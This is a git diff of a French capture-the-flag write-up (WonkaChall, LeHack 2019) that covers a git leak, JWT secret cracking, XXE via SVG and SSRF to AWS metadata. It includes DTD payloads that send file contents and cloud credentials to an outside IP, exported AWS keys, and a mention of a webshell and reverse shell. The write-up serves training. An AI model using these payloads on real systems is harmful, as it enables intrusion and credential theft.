@@ -21,6 +21,7 @@ Cette année, le WonkaChall est resté sur la même lancée en ajoutant une part
 
 1. Part 1 - WEB : https://akerva.com/blog/wonkachall-akerva-lehack-2019-write-up-part-1-web/
 2. Part 2 - WINDOWS : https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-2-windows/
+3. Part 3 - LINUX : https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-3-linux/
 
 Cet article va se découper en 13 parties, une pour chaque flag à trouver. Mais avant d'attaquer le vif du sujet, ci-dessous un schéma du réseau complet (attention, petit spoil :)) : 
 
@@ -46,13 +47,15 @@ Le point d'entrer du challenge se trouve avec ce lien : https://willywonka.shop
 
 ### I.1. Directory listing
 
+<center>
 ![](/img/writeups/wonkachall2019/step1_index.png)
 _Fig 1_ : Index du site
+</center>
 
 Première chose que je fais en arrivant sur un site, c'est de lancer `dirsearch`. La wordlist par défaut est vraiment pertinente, en général ce qu'elle sort se transforme en quick win :
 
 ```bash
-➜ ./dirsearch.py -u https://willywonka.shop/ -e .html,.php,.txt           
+(KaliVM) ➜ ./dirsearch.py -u https://willywonka.shop/ -e html,php,txt           
 
 Extensions: .html, .php, .txt | HTTP method: get | Threads: 10 | Wordlist size: 6878
 
@@ -91,8 +94,10 @@ Target: https://willywonka.shop/
 
 Un dossier `.git` a donc été trouvé. Même si ce genre de dossier affiche un beau "403 Forbidden", les fichiers sont souvent accessible : 
 
+<center>
 ![](/img/writeups/wonkachall2019/step1_git.png)
 _Fig 2_ : Dossier git accessible
+</center>
 
 Il est donc possible de récupérer le contenu des anciens commits grâce à `GitTools`.
 
@@ -101,16 +106,16 @@ Il est donc possible de récupérer le contenu des anciens commits grâce à `Gi
 Pour récupérer l'intégralité du `git`, on va d'abord utiliser le script `gitdumper.sh` puis le `extractor.sh` pour récupérer les différents commits.
 
 ```bash
-➜ mkdir out_dump  
-➜ /opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ out_dump
+(KaliVM) ➜ mkdir out_dump  
+(KaliVM) ➜ /opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ out_dump
 
 [*] Destination folder does not exist
 [+] Creating a/.git/
 [+] Downloaded: HEAD
 [...]
 
-➜ mkdir out_extract
-➜ /opt/t/pentest/exploit/GitTools/Extractor/extractor.sh out_dump out_extract                         
+(KaliVM) ➜ mkdir out_extract
+(KaliVM) ➜ /opt/t/pentest/exploit/GitTools/Extractor/extractor.sh out_dump out_extract                         
 
 [+] Found commit: 8cda59381a6755d33425cb4ccddcc011a85649c6
 [+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/.env
@@ -123,7 +128,7 @@ Pour récupérer l'intégralité du `git`, on va d'abord utiliser le script `git
 Il ne reste plus qu'à aller chercher le flag :
 
 ```bash
-➜ cat out_dump/.git/COMMIT_EDITMSG 
+(KaliVM) ➜ cat out_dump/.git/COMMIT_EDITMSG 
 Added debug mode with "debug=1" GET param
 
 A wild flag appears !
@@ -178,18 +183,24 @@ En enlevant les fichiers liés au `.git` du `dirsearch` précédent, il reste le
 
 Lors de l'utilisation de l'application, on se rend compte qu'il est possible de faire de l'énumération d'utilisateur :
 
+<center>
 ![](/img/writeups/wonkachall2019/step2_unable_to_find_user.png)
 _Fig 3_ : Impossible de trouver l'utilisateur
+</center>
 
 Pour tester cette théorie, j'ai utilisé la wordlist des usernames de seclist. Cette wordlist est plutôt courte, donc rapide. L'intruder de la version gratuite de burp fait l'affaire pour ce test :
 
+<center>
 ![](/img/writeups/wonkachall2019/step2_intruder.png)
 _Fig 4_ : Enumération d'utilisateur 1/2
+</center>
 
 Si un utilisateur valide est soumit à l'application, alors cette application renvoit... Une erreur 500. A savoir aussi que ce bruteforce d'utilisateur ne sert __à rien__ et m'a même fait perdre du temps par la suite. La liste des utilisateurs peut être trouvée sur l'index du site :
 
+<center>
 ![](/img/writeups/wonkachall2019/step2_users_list_index.png)
 _Fig 5_ : Enumération d'utilisateur 2/2
+</center>
 
 Les utilisateurs sont donc :
 
@@ -206,7 +217,7 @@ Les utilisateurs sont donc :
 En regardant de plus près les sources obtenues dans le `.git` de l'étape 1, on remarque qu'il y a une histoire de debug. Une variable `/?debug=1` :
 
 ```bash
-➜ cat 0-7a1756aae221342ab09f9101358201bbfa70a702/config/routes.yaml 
+(KaliVM) ➜ cat 0-7a1756aae221342ab09f9101358201bbfa70a702/config/routes.yaml 
 #index:
 #    path: /
 #    controller: App\Controller\DefaultController::index
@@ -217,8 +228,10 @@ debug:
 
 N'étant pas familier avec Symphony, j'ai perdu du temps à comprendre pourquoi cette variable ne fonctionnait pas sur la route principale. Finalement, placer un utilisateur valide (tel que `aas`) dans le formulaire de reset et ajouter le paramètre GET renvoit la stacktrace de l'application :
 
+<center>
 ![](/img/writeups/wonkachall2019/step2_stacktrace.png)
 _Fig 6_ : Stacktrace de l'application
+</center>
 
 > https://willywonka.shop/reset?debug=1
 
@@ -303,7 +316,7 @@ Cette trace divulgue des informations sensibles quant au SI de la cible :
 Nouveau site web, nouveau dirsearch. Celui-ci renvoit énormément de `403`. Après un filtrage de qualité, le scan donne des résultats pertinents :
 
 ```bash
-➜  wonkachall2019 git:(master) ✗ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e .php,.html,.txt,.pdf,.zip -t 25 | grep -v 403
+(KaliVM) ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e .php,.html,.txt,.pdf,.zip -t 25 | grep -v 403
 
 Target: https://backend.willywonka.shop
 
@@ -316,8 +329,10 @@ Target: https://backend.willywonka.shop
 
 Les résultats sont relativement équivalents aux résultats du frontend. Cependant, toutes les pages du backend sont redirigé vers une page de `/login`. Cette page attend un JSON Web Token (JWT) :
 
+<center>
 ![](/img/writeups/wonkachall2019/step2_backend_jwt.png)
 _Fig 7_ : Cookie backend-session 
+</center>
 
 Le token contient : 
 
@@ -362,7 +377,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx
 Afin de faire un nouveau jeton fonctionnel, il faut modifier les éléments suivants : `aud` et `exp`. Le premier élément permet de sélectionner le bon domaine. Le second, correspond à l'expiration du token, une date suffisamment éloignée garantit la tranquilité. Modifier un JWT `HS256` est relativement simple. Il existe un certain nombre d'outils efficace, comme `jwt_tool`. En plaçant une wordlist pertinente en paramètre, cet outil peut bruteforce le secret du token :
 
 ```bash
-➜ python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt 
+(KaliVM) ➜ python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt 
 
 Token header values:
 [+] typ = JWT
@@ -399,8 +414,10 @@ Le secret a été cassé avec succès, il est possible de signer le nouveau jeto
 * aud : backend.willywonka.shop
 * exp : 1999999999 -> Une date aux alentours de 2033
 
+<center>
 ![](/img/writeups/wonkachall2019/step2_jwtcrafted.png)
 _Fig 8_ : Nouveau jeton
+</center>
 
 Avec ce nouveau JWT, il est possible de passer outre l'authentification et ainsi accèder au backend de l'application :
 
@@ -410,8 +427,10 @@ https://backend.willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzd
 
 Conformément à l'énoncé, le flag se situe dans les données du ticket `deadbeef` :
 
+<center>
 ![](/img/writeups/wonkachall2019/step2_auth_bypassed.png)
 _Fig 9_ : Second flag
+</center>
 
 ### II.6. Flag
 
@@ -428,7 +447,7 @@ _Fig 9_ : Second flag
 ---
 ---
 
-## III. Step 3 - Simple XXE OOB
+## III. Step 3 - XXE Out-of-band
 
 > There's a flag.txt at the server root 
 
@@ -436,39 +455,45 @@ _Fig 9_ : Second flag
 
 ### TL;DR
 
-1. Forger une XXE OOB via fichier SVG : [rest.svg](./step3/rect.svg)
-2. Uploadant le fichier [ro.svg](./step3/ro.svg) à l'adresse : `http://willywonka.shop/profile?filetype=image%2fsvg%2bxml`
-3. Mettre `aas` en nom de victime et de la donnée random pour le reste
-4. Récupérer l'id du ticket et y accéder dans le backend
-5. Cliquer sur `autoresize` pour déclencher la XXE OOB et récupérer le flag
+1. Forger une XXE OOB via fichier SVG ;
+2. Upload le fichier SVG à l'adresse : `http://willywonka.shop/profile?filetype=image%2fsvg%2bxml`, ne pas oublier de changer le MIME type ;
+3. Remplir le formulaire avec `aas` en nom de victime et de la donnée random ;
+4. Récupérer l'id du ticket et y accéder dans le backend ;
+5. Cliquer sur `autoresize` pour déclencher la XXE OOB.
 
 ---
 
-### III.1. State of the art
+### III.1. Reconnaissance
 
-Ayant découvert le hint directement, je savais que je cherchais une XXE via un SVG. Ici, il va falloir upload un SVG sur le frontend et y accéder via le backend avec l'id du ticket.
+La [plateforme](https://challenge.akerva.com) du challenge propose un hint par épreuve. Celui de cette épreuve dit clairement qu'il s'agit d'une XXE via SVG. Le MIME type du fichier à envoyer est défini dans un paramètre GET, sur la page `submit` du __frontend__.
 
-Comme vu précédemment, le lien de reset récupéré sur le frontend nous donne accès au formulaire d'upload en étant authentifié.
+Il est possible pour un attaquant de changer ce MIME type et ainsi uploader un fichier SVG XML contenant la charge de la XXE. Lorsque le ticket est correctement uploadé, un identifiant est généré. Cet identifiant permet d'accéder au ticket dans le __backend__.
 
+<center>
 ![](/img/writeups/wonkachall2019/step3_frontendform.png)
-_Fig 9_ : Frontend upload form
+_Fig 10_ : Formulaire d'upload sur le frontend
+</center>
 
-De base l'url est la suivante : `https://frontend.willywonka.shop/profile?filetype=image%2Fpng`
+### III.2. Explication de l'exploitation
 
-Le truc intéressant ici est le paramètre `filetype` qui contient le mime type du fichier que l'on veut envoyer. Etant donné qu'on veut faire une XXE OOB via SVG, notre mime type sera donc : `image%2fsvg%2bxml`
+Par défaut, l'URL du __frontend__ accepte les image PNG : `https://frontend.willywonka.shop/profile?filetype=image%2Fpng`
 
-Pour les retardataires du fond, une XXE OOB est comme une "blind" XXE. On va upload un premier fichier XML (dans notre cas, un fichier SVG contenant du XML) contenant une ressource externe, herbergée un serveur maîtrisé. Une fois qu'on déclenche la XXE, alors le DTD externe est appelé et les entités de ce DTD aussi. C'est à ce moment là qu'on va faire de l'exfiltration de données.
+Afin que l'application accepte les SVG XML : `image%2fsvg%2bxml`
 
+Une XXE Out-of-band (OOB) est similaire à une XXE "classique", ou in-band. Une OOB est une XXE à l'aveugle qui va charger un DTD distant. Les entitées présentes dans ce DTD seront ensuite executées, permettant ainsi de forcer une extraction de données. Le schéma suivant devrait être plus parlant :
+
+<center>
 ![](/img/writeups/wonkachall2019/step3_xxe_oob_nutshell.png)
-_Fig 10_ : XXE OOB in a nutshell
+_Fig 11_ : XXE OOB in a nutshell
+</center>
 
-J'ai déjà parlé de XXE OOB lors du [Santhacklaus](/walkthrough/santhacklaus2018/#archdrive-4-3), j'ai utilisé un serveur externe, mais il est possible de jouer avec deux ngrok.
+Lors de CTF passés, j'ai déjà évoqué les XXE OOB : [Santhacklaus 2018](https://maki.bzh/walkthrough/santhacklaus2018/#archdrive-4-3). Dans cet article, le même serveur a été utilisé, mais il est possible d'utiliser deux instances [ngrok](https://maki.bzh/stupidthings/dontpayvps/).
 
-### III.2. Exploitation
+### III.3. Exploitation
 
-Si vous avez bien suivi l'explication précédente, on va générer plusieurs fichiers :
+Ci-dessous les fichiers nous permettant de mener à bien l'exploitation :
 
-* ro.svg : Le SVG contenant le stage 1 de l'attaque
+* ro.svg : Le SVG XML contenant l'appelle des entités externes du fichier DTD.
 
 ```xml
 <!DOCTYPE svg [
@@ -480,26 +505,34 @@ Si vous avez bien suivi l'explication précédente, on va générer plusieurs fi
 </svg>
 ```
 
-* ro.dtd : La vraie charge, pour récupérer les données souhaitées
+* ro.dtd : Charge contenant les entités permettant de cibler un fichier et exfiltrer son contenu.
 
 ```xml
 <!ENTITY % secret1 SYSTEM "file:///flag.txt">
 <!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
 ```
 
-Donc maintenant il suffit d'uploader notre `ro.svg` :
+__Note__ : L'adresse IP utilisée (51.158.113.8) est un VPS temporaire chez _Scaleway_ avec un __Python SimpleHTTPServer__ sur le port 80.
 
+Lorsque l'environnement est correctement configuré, il ne reste qu'à uploader la charge via le formulaire sur le __frontend__ : 
+
+<center>
 ![](/img/writeups/wonkachall2019/step3_frontend_form_filled.png)
-_Fig 11_ : Frontend filled form
+_Fig 12_ : Formulaire frontend rempli
+</center>
 
-Une fois le svg uploadé, il suffit d'y accéder via l'id du ticket. Pour déclencher la XXE, il faut cliquer sur `Autoresize` le résultat s'affiche :
+En retour le __frontend__ nous renvoi l'identifiant du ticket : _e6afec4a_. Le bouton __Autoresize__ de l'application en __backend__ appelle le parser XML vulnérable. C'est donc à ce moment que la charge est exécutée. 
 
+__Note__ : On peut oberserver de l'activité sur les logs du __Python SimpleHTTPServer__.
+
+<center>
 ![](/img/writeups/wonkachall2019/step3_flag.png)
-_Fig 12_ : Backend ticket
+_Fig 13_ : Ticket côté backend
+</center>
 
-Une vraie XXE OOB n'aurait pas de retour, m'enfin, on va pas se plaindre. On peut donc afficher le contenu des fichiers, tant qu'on connait le chemin et que notre utilisateur a les droits.
+Dans ce cas précis, ce n'est pas réellement une XXE OOB, car le retour s'affiche sur l'application (cf. Fig 13 - Ticket côté backend).
 
-### III.3. Flag
+### III.4. Flag
 
 > 0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630
 
@@ -510,75 +543,47 @@ Une vraie XXE OOB n'aurait pas de retour, m'enfin, on va pas se plaindre. On peu
 1. __alexbirsan__, _LFI and SSRF via XXE in emblem editor_, HackerOne : https://hackerone.com/reports/347139
 2. __Ian Muscat__, _Out-of-band XML External Entity (OOB-XXE)_, Acunetix : https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/
 
+---
+---
+
 ## IV. Step 4 - SSRF to KFC
 
 >  Lets check this bucket ! 
 
 ### TL;DR
 
-1. Grâce à l'indice d'Akerva, on sait qu'il faut jouer avec du AWS S3 Bucket
-2. Avec la XXE OOB, on peut récupérer les identifiants à l'adresse : `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-3. Récupérer les informations du bucket : `http://169.254.169.254/latest/dynamic/instance-identity/document`
+1. La XXE OOB nous permet de récupérer les identifiants S3 Bucket à l'adresse : `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+2. Les informations du bucket se situent : `http://169.254.169.254/latest/dynamic/instance-identity/document`
 3. Initialiser les variables d'environnements avec les informations trouvées pour se connecter `AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN`
 4. Lister le contenu du bucket : `aws s3 ls s3://willywonka-shop`
 5. Récupérer le flag : `aws s3 cp s3://willywonka-shop/Flag-04.txt .`
 
 ---
 
-### IV.1. State of the art
+### IV.1. Reconnaissance
 
-D'après l'énoncé, il y a une histoire de bucket, ma première pensé a donc été bucket s3 de amazon. C'est la première fois que j'ai à jouer avec cette techno, j'avais lu pleins d'articles mais jamais expérimenté. C'est cool ! :D
-
-Cependant, le premier reflexe a été de récupérer le `.bash_history`, voici les commandes intéressantes :
+Dû à la XXE OOB, il est possible de récupérer le contenu de certains fichiers, il faut connaitre son chemin et avoir les droits. En général, un attaquant essaiera de récupérer le fichier `/etc/passwd`, afin de récupérer les utilisateurs du système. Parfois, il arrive que le `.bash_history` de l'utilisateur courant soit accessible par tout le monde, c'est ce qu'il s'est passé dans notre cas :
 
 ```bash
 [...]
-sudo vim flag.txt 
-exit 
-curl 
-curl http://169.254.169.254/latest/meta-data/ 
-curl 
-curl http://169.254.169.254/latest/meta-data/iam 
-curl 
-curl http://169.254.169.254/latest/meta-data/iam/ 
-curl 
-curl http://169.254.169.254/latest/meta-data/iam/info 
-curl 
-curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3 
-curl 
+sudo vim flag.txt
 curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3/ 
-curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3/ 
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ 
-ifcondfig 
-ifconfig 
-ping frontend-prod 
-nc -vz 172.31.46.235 3306 
-nc -vz 172.31.46.235 22 
-nc -vz 172.31.46.235 3306 
-nc -vz 172.31.46.235 3304 
-nc -vz 172.31.46.235 3306 
-ls 
-cd back/ 
-ls 
-grep -nRi "test/" 
-nano -c app.py 
-ls 
-sudo systemctl restart backend 
-grep -nRi "
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/  
+[...]
 ```
 
-La première chose est d'utiliser la XXE pour taper sur l'IP d'Amazon et récupérer les informations du bucket, on a le lien dans le bash_history : `http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/`
+Pour des raisons de lisibilité, j'ai tronqué le contenu du fichier pour ne garder que les quelques lignes intéressantes.
+
+Revenons à notre XXE, jusqu'à présent seul le le schéma `file://` a été utilisé. Amazon utilise le schéma `http://` pour récupérer les informations du bucket S3. Le `.bash_history` trouvé précédemment nous donne une de ces requêtes : `http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/`
 
 ### IV.2. Exploitation
 
-Il suffit de modifier le `file:///flag.txt` de `ro.dtd` et ça nous donne :
+En remplaçant `file:///flag.txt` par `http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/` dans la charge __ro.dtd__, il est possible de récupérer les informations de connexions.
 
 ```xml
 <!ENTITY % secret1 SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/">
 <!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
 ```
-
-output :
 
 ```json
 {
@@ -592,14 +597,12 @@ output :
 }
 ```
 
-Pour accéder à un bucket s3, il ne suffit pas d'avoir l'accesskey et le secret, il faut aussi la zone utilisée :
+Pour accéder au contenu d'un bucket S3, il faut différentes informations secrètes mais aussi la zone du bucket :
 
 ```xml
 <!ENTITY % secret1 SYSTEM "http://169.254.169.254/latest/dynamic/instance-identity/document">
 <!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
 ```
-
-output :
 
 ```json
 {
@@ -621,59 +624,55 @@ output :
 }
 ```
 
-Maintenant nous avons toutes les informations pour se connecter au bucket s3. Il ne nous reste plus qu'à initialiser les différentes variables d'environnement.
+Lorsque toutes ces informations sont réunies, en configurant les différentes variables d'environnement, il est possible de se connecter au bucket. 
 
 ### IV.3. Connexion au bucket s3
 
 ```bash
-export AWS_ACCESS_KEY_ID=ASIAZ47IG35A57E4JGVL
-export AWS_SECRET_ACCESS_KEY=44tVG3Dv0xhPslIR52Fwmk6Vo5iwmof/EEIQF3aQ
-export AWS_DEFAULT_REGION=eu-west-3
-export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDkaCWV1LXdlc3QtMyJGMEQCIGmZTy1kpupPx9pOZGQ4d4pyTs0J/1NlHz4FBmd20XlOAiB6THoIFFw+wMoOQru3UoiEEzFybPv6Rr589TKaKGfjMSrdAwii//////////8BEAAaDDY4MDcwMjQzNTEzNyIMXgOibqCvChZ3RNFWKrED35t3r32Ff40kXU7sacZz1AB4V2KUQLQgBch26QfsJ8QW1WJcs21SnqtcJA6Fw5UxAmWk2PKrrIHRZcjmFH0dFsMnQ838ZY/HyPPhDdX60WZC5Czxect7sXkWDHLJK0ZQtSx3rT/TmANLoySZxD0DX5J+HNIISsmwaCx6omr/8TzpL7ZY2kXkWw/CLLYQIc/71NWO4IUOO+4Q9kdhwa1NzwX7CIoPQHG5ICX1i7Z3LnmuiLLsYgSxhY3Ne6TyIbt8gMHusVTAycltqjS5NcAxKstLrnqNMpYZ+WO4kwaKJSNCtLhb+cn98OihfsWECa3T9eaFcpqkGrhL8QkDgucb7XJNKiV7tkV8Qmp0ajtWLaBNqf0IBs1Xem/+H/KeRAMINVeNu6JXxD/5NjmjDo/umecpMlw3lXfX8Kd+LsXjKs2HDVr5QwLr+q8SF4W8vGFbq88U3blTXJ+jtvKpnOFB/QZy9cmEE/s5pD0PEc75VFnbGRcJYZjFzYQcttoW+YcjxaHHIpg41KWURYs9cV5TnAWViNAQk/CvP0Jj44zR7ixB/DHZW2Viw1+erIHLxWf8ZzDw1NDpBTq1AdGK7QkjqfH40mkHEcZBCaiKEl3CYU3G+jLsGkOeV9+m1254Yn3RWKlwISPbYFdg6W69jqvLd7wrtr1AU68rAl7LMZsiDCQGQ3gSSUOvNuQA9dVyZHd4gLptKgobAhDTt92dGI9553Tl5JwL2457IcJ0NtO2Nwa2AvoG1QUfxoSWg6nxJpFtexZyFm3rceEPHyXffuBsH+r3zuFUAklQ9/UYxLCMWi4Nq4ltYx99+Jd+R4aIYR4=
+(KaliVM) ➜ export AWS_ACCESS_KEY_ID=ASIAZ47IG35A57E4JGVL
+(KaliVM) ➜ export AWS_SECRET_ACCESS_KEY=44tVG3Dv0xhPslIR52Fwmk6Vo5iwmof/EEIQF3aQ
+(KaliVM) ➜ export AWS_DEFAULT_REGION=eu-west-3
+(KaliVM) ➜ export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDkaCWV1LXdlc3QtMyJGMEQCIGmZTy1kpupPx9pOZGQ4d4pyTs0J/1NlHz4FBmd20XlOAiB6THoIFFw+wMoOQru3UoiEEzFybPv6Rr589TKaKGfjMSrdAwii//////////8BEAAaDDY4MDcwMjQzNTEzNyIMXgOibqCvChZ3RNFWKrED35t3r32Ff40kXU7sacZz1AB4V2KUQLQgBch26QfsJ8QW1WJcs21SnqtcJA6Fw5UxAmWk2PKrrIHRZcjmFH0dFsMnQ838ZY/HyPPhDdX60WZC5Czxect7sXkWDHLJK0ZQtSx3rT/TmANLoySZxD0DX5J+HNIISsmwaCx6omr/8TzpL7ZY2kXkWw/CLLYQIc/71NWO4IUOO+4Q9kdhwa1NzwX7CIoPQHG5ICX1i7Z3LnmuiLLsYgSxhY3Ne6TyIbt8gMHusVTAycltqjS5NcAxKstLrnqNMpYZ+WO4kwaKJSNCtLhb+cn98OihfsWECa3T9eaFcpqkGrhL8QkDgucb7XJNKiV7tkV8Qmp0ajtWLaBNqf0IBs1Xem/+H/KeRAMINVeNu6JXxD/5NjmjDo/umecpMlw3lXfX8Kd+LsXjKs2HDVr5QwLr+q8SF4W8vGFbq88U3blTXJ+jtvKpnOFB/QZy9cmEE/s5pD0PEc75VFnbGRcJYZjFzYQcttoW+YcjxaHHIpg41KWURYs9cV5TnAWViNAQk/CvP0Jj44zR7ixB/DHZW2Viw1+erIHLxWf8ZzDw1NDpBTq1AdGK7QkjqfH40mkHEcZBCaiKEl3CYU3G+jLsGkOeV9+m1254Yn3RWKlwISPbYFdg6W69jqvLd7wrtr1AU68rAl7LMZsiDCQGQ3gSSUOvNuQA9dVyZHd4gLptKgobAhDTt92dGI9553Tl5JwL2457IcJ0NtO2Nwa2AvoG1QUfxoSWg6nxJpFtexZyFm3rceEPHyXffuBsH+r3zuFUAklQ9/UYxLCMWi4Nq4ltYx99+Jd+R4aIYR4=
 
-➜ aws s3 ls                                      
+(KaliVM) ➜ aws s3 ls                                      
 2019-07-04 18:41:42 willywonka-shop
 ```
 
-### IV.4. Get files
+La connexion étant établie, nous sommes en mesure de récupérer son contenu :
 
-Il ne nous reste plus qu'à ce servir dans ce bucket :
-
-```bash
-➜ aws s3 ls                      
+```
+(KaliVM) ➜ aws s3 ls                      
 2019-07-04 18:41:42 willywonka-shop
 
-➜ aws s3 ls s3://willywonka-shop/
+(KaliVM) ➜ aws s3 ls s3://willywonka-shop/
                            PRE images/
                            PRE tools/
 2019-07-05 13:54:47         65 Flag-04.txt
 
-➜ aws s3 ls s3://willywonka-shop/tools      
+(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools      
                            PRE tools/
 
-➜ aws s3 ls s3://willywonka-shop/tools/     
+(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools/     
                            PRE docs/
                            PRE vpn/
 2019-07-05 10:15:18          0 
 
-➜ aws s3 ls s3://willywonka-shop/tools/docs/
+(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools/docs/
 2019-07-05 13:15:12          0 
 2019-07-05 13:15:32    1140644 MachineAccountQuota is USEFUL Sometimes_ Exploiting One of Active Directory\'s Oddest Settings.pdf
 2019-07-05 13:15:45    1726183 Preventing Mimikatz Attacks – Blue Team – Medium.pdf
                                 
-➜ aws s3 cp s3://willywonka-shop/Flag-04.txt .
+(KaliVM) ➜ aws s3 cp s3://willywonka-shop/Flag-04.txt .
 download: s3://willywonka-shop/Flag-04.txt to ./Flag-04.txt 
 
-➜ aws s3 cp s3://willywonka-shop/tools/vpn/wonka_internal.ovpn .
+(KaliVM) ➜ aws s3 cp s3://willywonka-shop/tools/vpn/wonka_internal.ovpn .
 download: s3://willywonka-shop/tools/vpn/wonka_internal.ovpn to ./wonka_internal.ovpn
 
-➜ cat Flag-04.txt 
+(KaliVM) ➜ cat Flag-04.txt 
 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528
 ```
 
-On récupère un fichier vpn, enfin ! Mais on récupère aussi un schéma réseau :
-
-![](/img/writeups/wonkachall2019/infra.png)
+En plus du flag de cette étape, il y a un fichier VPN `wonka_internal.ovpn` dans le bucket. Laissant présager de l'active directory.
 
 ### IV.5. Flag
 
@@ -686,59 +685,65 @@ On récupère un fichier vpn, enfin ! Mais on récupère aussi un schéma résea
 1. __@christophetd__, _Abusing the AWS metadata service using SSRF vulnerabilities_, Blog de Christophe Tafani-Dereeper : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/
 2. __notsosecure team__, _Exploiting SSRF in AWS Elastic Beanstalk_, notsosecure : https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/
 
-## V. Step 5 - Tom and Jerry
+---
+---
+
+## V. Step 5 - Tom(cat) and Jerry
 
 >  Lets get the flag at the root of your first blood 
 
 ### TL;DR
 
-1. Se connecter au VPN récupéré dans le bucket
-2. Voir qu'il y a une nouvelle route qui est apparue : `172.16.42.0/24`
-3. Enumération du réseau interne et voir une machine avec le port 8080 (tomcat)
-4. Après un `dirsearch` avec une wordlist spécial tomcat (seclist), on trouve la page `/host-manager/`
-5. Se connecter avec les creds `tomcat : tomcat`
-6. Monter un partage `data` avec un webshell (`cmd.war`) à l'intérieur
-7. Déployer ce nouvel host via les `UNC path`
-8. Accéder au webshell à l'adresse : `http://maki-lab:8080/cmd/index.jsp?cmd=whoami`
-7. Faire un reverse shell et récupérer le flag
+1. Se connecter au VPN récupéré dans le bucket ;
+2. Une nouvelle route est apparue : `172.16.42.0/24` ;
+3. Enumération de ce nouveau réseau et remarquer une machine avec le port 8080 (tomcat) ouvert ;
+4. Utiliser `dirsearch` avec une wordlist tomcat (seclist), on trouve la page `/host-manager/` ;
+5. Se connecter avec les identifiants `tomcat : tomcat` ;
+6. Monter un partage samba nommé `data` avec un webshell (__cmd.war__) à l'intérieur ;
+7. Déployer le webshell en tant que nouvelle application via les `UNC path` ;
+8. Accéder au webshell à l'adresse : `http://maki-lab:8080/cmd/index.jsp?cmd=whoami` ;
+7. Utiliser __netcat__ pour faire un reverse shell.
 
 ---
 
-### V.1. Network recon
+### V.1. Reconnaissance
 
-Un fichier OpenVPN ! Enfin de l'interne ! Lorsque le tunnel VPN est monté, une nouvelle route apparait :
+Lorsque le tunnel VPN est correctement monté, une nouvelle apparait :
 
 ```bash
-➜  ip r | grep tun0
+➜ ip r | grep tun0
 10.8.0.1 via 10.8.0.17 dev tun0 
 10.8.0.17 dev tun0 proto kernel scope link src 10.8.0.18 
 172.16.42.0/24 via 10.8.0.17 dev tun0 
 ```
 
-Maintenant il est temps de scanner le sous réseau : `172.16.42.0/24`
+Dans le but de trouver tous les hôtes de ce réseau, il existe plusieurs techniques de reconnaissances : 
+
+* __Ping scan__ : Qui est rapide mais peu pertinent depuis que la plupart des hôtes Windows ne répondent pas au ping. De plus, le ping scan de nmap (-sn) fonctionne de la façon suivante : ping, vérification du port 80, vérification du port 443, ping ;
+* __Port scan__ : Retenir quelques ports connues et voir s'ils sont ouverts. Cette méthode est un peu plus lente mais fonctionne relativement bien.
+
+__Note__ : Personnellement je fais un __premier masscan__ avec environ 100 ports connus sur l'ensemble du réseau. Un __second masscan__ avec l'ensemble des ports TCP et UDP sur les hôtes trouvés. Enfin, __un nmap__ spécifique sur les ports et hôtes trouvés. C'est la méthode la plus rapide que j'ai trouvé jusqu'à présent.
+
+Ci-dessous le _premier masscan_ :
 
 ```bash
-sudo masscan -e tun0 -p22,21,23,80,443,445,139,136,111,U:161,U:162,U:53,1433,3306,53,3389,5432,631 --rate 1000 172.16.42.0/24
-
